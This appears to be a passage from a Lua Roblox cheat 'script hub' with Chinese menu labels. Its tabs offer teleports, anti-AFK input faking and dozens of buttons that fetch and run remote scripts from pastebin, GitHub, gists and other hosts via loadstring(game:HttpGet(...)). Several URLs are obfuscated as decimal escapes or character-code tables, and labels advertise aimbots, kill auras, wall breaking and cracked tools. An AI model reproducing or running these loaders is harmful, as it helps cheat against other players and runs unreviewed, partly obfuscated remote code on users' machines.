Tab:AddToggle(
    {
        Name = "自动购买腰带",
        Default = false,
        Callback = function(x)
            autobuybelts = x
            if autobuybelts then
                buybelts()
            end
        end
    }
)
Tab:AddToggle(
    {
        Name = "自动购买称号（等级）",
        Default = false,
        Callback = function(x)
            autobuyranks = x
            if autobuyranks then
                buyranks()
            end
        end
    }
)
Tab:AddToggle(
    {
        Name = "自动购买忍术",
        Default = false,
        Callback = function(x)
            autobuyskill = x
            if autobuyskill then
                buyskill()
            end
        end
    }
)

local Tab = Window:MakeTab({
	Name = "力量传奇",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "力量传奇"
})
Tab:AddButton({
	Name = "传送到出生点",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7, 3, 108)
  	end    
})
Tab:AddButton({
	Name = "传送到冰霜健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2543, 13, -410)
  	end    
})
Tab:AddButton({
	Name = "传送到神话健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2177, 13, 1070)
  	end    
})
Tab:AddButton({
	Name = "传送到永恒健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6686, 13, -1284)
  	end    
})
Tab:AddButton({
	Name = "传送到传说健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4676, 997, -3915)
  	end    
})
Tab:AddButton({
	Name = "传送到肌肉之王健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8554, 22, -5642)
  	end    
})
Tab:AddButton({
	Name = "传送到安全岛",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-39, 10, 1838)
  	end    
})
Tab:AddButton({
	Name = "传送到幸运抽奖区域",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2606, -2, 5753)
  	end    
})
local Tab = Window:MakeTab({
	Name = "造船寻宝",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "付费功能"
})
Tab:AddButton({
	Name = "自动刷金条",
	Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/Lyy77rnr",true))()
  	end
})
Tab:AddButton({
	Name = "工具包（可破别人团队模式空气墙）",
	Callback = function()
     loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()	
  	end
})
Tab:AddButton({
	Name = "飞行装备（可控制物体）",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/main/feixing"))()		
  	end
})
Tab:AddButton({
	Name = "防止掉线（反挂机）",
	Callback = function()
	print("Anti Afk On")
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
  	end
})

local Tab = Window:MakeTab({
    Name = "通用中心",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "脚本",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/raw-scriptpastebin/raw/main/B_Genesis'))()
	end
})

Tab:AddButton({
	Name = "操人脚本",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/bzmhRgKL'))()
	end
})

Tab:AddButton({
	Name = "白脚本(已修复)",
	Callback = function()
_G["白脚本作者修狗"]="xdjhadgdsrfcyefjhsadcctyseyr6432478rudghfvszhxcaheey"loadstring(game:HttpGet(('https://raw.githubusercontent.com/wev666666/baijiaobengV2.0beta/main/%E7%99%BD%E8%84%9A%E6%9C%ACbeta'),true))() 
end
})

Tab:AddButton({
	Name = "阿尔宙斯V3",
	Callback = function()
loadstring(game: HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))() 
end
})

Tab:AddButton({
	Name = "EZ Hub（支持150个游戏脚本）",
	Callback = function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
	end
})

Tab:AddButton({
	Name = "客户端脚本中心",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ObviouslyOrchi/Moonlight_Client.lua/main/Universal",true))()
	end
})

Tab:AddButton({
	Name = "作弊中心",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/mrgunz/UnnamedCheat/main/Loader"))();
	end
})

Tab:AddButton({
	Name = "阿斯顿中心",
	Callback = function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
	end
})

Tab:AddButton({
	Name = "脚本中心3密钥：released",
	Callback = function()	
	-- DISCORD: https://discord.gg/8YZMwfYaNq

getgenv().key = "JOIN DISCORD FOR KEY";
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ner0ox/sexy-script-hub/main/Loader.lua"))()
	end
})

Tab:AddButton({
	Name = "脚本中心（外网）",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Games-Hub-Script/main/Games%20Hub%20(Always%20updated)"))()
	end
})

Tab:AddButton({
	Name = "HOHO中心",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
	end
})
Tab:AddButton({
	Name = "移动中心",
	Callback = function()
	loadstring(game:HttpGetAsync("https://shz.al/~mobile-hub-v2"))()
	end
})

Tab:AddButton({
	Name = "Every day中心",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/KATERGaming/Roblox/main/KaterHub.Lua"))()
	end
})

Tab:AddButton({
	Name = "脚本中心（另一版本）",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/fgasfga/SCRIPT-HUB/main/Hello.lua", true))()
	end
})

Tab:AddButton({
	Name = "通用中心",
	Callback = function()	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/main/main/script"))()
	end
})

Tab:AddButton({
	Name = "140中心",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
	end
})

Tab:AddButton({
	Name = "伦敦中心",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader"))()
	end
})
local Tab = Window:MakeTab({
    Name = "刀刃球（磨针哥）[天皇]",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
    Name = "1",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BladeBall/main/eng"))()
		end
})
Tab:AddButton({
    Name = "2",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/autoparry.lua"))()
		end
})
local Tab = Window:MakeTab({
    Name = "地下城任务🤔@适雾昂",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "1",
	Callback = function()
	loadstring(game:HttpGet("https://gist.githubusercontent.com/hngamingroblox/659adbebad6a9b3a07527e5f7e446d66/raw"))();
	end
})
local Tab = Window:MakeTab({
    Name = "CW@适雾昂🤓",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
    Name = "无限体力",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/SFQbTHM3"))()
		end
})
Tab:AddButton({
    Name = "2",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/frkfx/Combat-Warriors/main/Script"))();
		end
})
local Tab = Window:MakeTab({
    Name = "VFLY",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "1",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/MHE1cbWF"))()
		end
})
local Tab = Window:MakeTab({
    Name = "陌生的宇宙事件@魔针哥",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "1",
	Callback = function()
	--- Trollge Universe Incident Script

loadstring(game:HttpGet("https://raw.githubusercontent.com/RedZenXYZ/TrollgeUniverseIncident/main/Trollge%20Universe%20Incident"))()
	    end
})
local Tab = Window:MakeTab({
    Name = "⭐️星东东",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "自瞄",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20Aimbot.lua"))()
		end
})
Tab:AddButton({
    Name = "最强战场",
	Callback = function()
	loadstring(Game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/tsbscripts/main/Main"))()
		end
})
Tab:AddButton({
    Name = "最强战场杀死脚本",
	Callback = function()
	loadstring(Game:HttpGet("https://pastefy.app/oKLqVHKF/raw"))()
		end
})
Tab:AddButton({
    Name = "刺客工具箱",
	Callback = function()
	CK_gjx = "作者_神罚"SheFa = "刺客群637340150"loadstring(game:HttpGet(('https://raw.github.com/WDQi/ckgjx/main/%E5%B7%A5%E5%85%B7%E7%AE%B1%EF%BC%88%E5%8A%A0%E5%AF%86%EF%BC%89.txt')))()
		end
})
Tab:AddButton({
    Name = "忍者传奇汉化",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/ws4Y6XhR"))()
		end
})
Tab:AddButton({
    Name = "最强doors",
	Callback = function()
	--[[Doors Blackking And BobHub脚本汉化]]loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
		end
})
Tab:AddButton({
    Name = "CW自动格挡",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/3wxDy1g5"))()
		end
})
Tab:AddButton({
    Name = "国家天空",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/KingHaxxor/King-Hax-Gui/main/Arab-Gui%E2%98%85"))();
		end
})
Tab:AddButton({
    Name = "白脚本破解版",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/LsrKtbPy"))()
		end
})
Tab:AddButton({
    Name = "fe scp173",
	Callback = function()
	loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/fe_scp_173.lua"))()
		end
})
Tab:AddButton({
    Name = "bf刷材料",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Tsuo7/TsuoHub/main/Tsuoscripts"))()
		end
})
Tab:AddButton({
    Name = "evade🤔🤔🤔",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Evade"))()
		end
})

Tab:AddButton({
    Name = "CW杀戮光环",
	Callback = function()
	loadstring(game:HttpGet("https://projecthook.xyz/scripts/free.lua"))()loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()
		end
})
Tab:AddButton({
    Name = "巴掌大战指令",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/longshulol/long/main/longshu/bazhang"))()
		end
})
Tab:AddButton({
    Name = "俄亥俄州移动速度",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/wQjdbYXE", true))()
		end
})
Tab:AddButton({
    Name = "鸭HUB",
	Callback = function()
	loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,81,89,49,113,112,99,115,106})end)())))()
		end
})
Tab:AddButton({
    Name = "林脚本",
	Callback = function()
	lin = "作者林"lin ="林QQ群 747623342"loadstring(game:HttpGet("https://raw.githubusercontent.com/linnblin/lin/main/lin"))()
		end
})
Tab:AddButton({
    Name = "猫猫王者1",
	Callback = function()
	getgenv().MAO = "猫猫王者脚本群935143896"
loadstring(game:HttpGet("https://raw.githubusercontent.com/dkfkfkfjfkfjdj/longshu/main/%E6%B7%B7%E6%B7%86%E6%96%87%E4%BB%B6.lua"))()("猫猫脚本 V2.0")
	end
})
Tab:AddButton({
    Name = "人形直升机",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/WX7GAeUD"))()
		end
})
Tab:AddButton({
    Name = "监狱人生管理员v1",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/rfAULQ83"))()
		end
})
Tab:AddButton({
    Name = "通用管理员",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
		end
})
Tab:AddButton({
    Name = "👍支持霖溺免费",
	Callback = function()
	LINNI_Script = "作者_霖溺" LINNI__Script = "作者QQ1802952013" LINNI___Script= "作者QQ群932613422"loadstring(game:HttpGet("https://shz.al/~LINNI_G/免费.txt"))()
		end
})
Tab:AddButton({
    Name = "doors十字架",
	Callback = function()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\97\75\110\100\76\102\98\122\34\41\41\40\41")()
		end
})
local Tab = Window:MakeTab({
    Name = "静新v2",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "1",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/jxdjbx/sjsjsnns/main/%E9%9D%99%E6%96%B0%E5%8A%A0%E5%BC%BA%E5%BC%BA"))()
		end
})
local Tab = Window:MakeTab({
    Name = "v7",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "我更不动了",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/XhQpcE5m"))()
		end
})
Tab:AddButton({
    Name = "😭😭😭",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/XhQpcE5m"))()
		end
})
local Tab = Window:MakeTab({
    Name = "巨魔公约",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "1",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Agonit/Trollge-Conventions/main/TC"))()
		end
})
local Tab = Window:MakeTab({
    Name = "Bob hub king 汉化脚本doors",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "脚本",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/65TwT8ja"))()
		end
})
local Tab = Window:MakeTab({
    Name = "fofo伙计",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "v2👍👍👍卡密fofo114514",
	Callback = function()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\115\104\122\46\97\108\47\126\102\111\102\111\49\49\52\53\49\52\34\41\41\40\41")()
		end
})
local Tab = Window:MakeTab({
    Name = "无名🤓~doors",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
    Name = "2736691058",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/dhvkgbhic/1578/main/doorsss666"))()
		end
})